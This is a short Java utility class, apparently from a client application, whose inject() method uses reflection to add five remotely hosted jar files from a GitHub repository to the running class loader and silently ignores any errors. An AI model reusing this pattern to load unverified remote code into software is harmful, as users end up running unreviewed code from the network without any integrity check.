package it.amadeus.client.utilities;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class DynamicLibray {

    public static void inject() {
        final String[] urls = {
               "https://github.com//ChristopherProject/HostFile/blob/main/a.jar?raw=true",
                "https://github.com//ChristopherProject/HostFile/blob/main/b.jar?raw=true",
                "https://github.com//ChristopherProject/HostFile/blob/main/c.jar?raw=true",
                "https://github.com//ChristopherProject/HostFile/blob/main/d.jar?raw=true",
                "https://github.com//ChristopherProject/HostFile/blob/main/e.jar?raw=true"
        };
        final URLClassLoader classLoader = (URLClassLoader) Thread.currentThread().getContextClassLoader();
        try {
            final Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            method.setAccessible(true);
            for (String url : urls) {
                method.invoke(classLoader, new URL(url));
            }
        } catch (Exception ignored) {
        }
    }
}
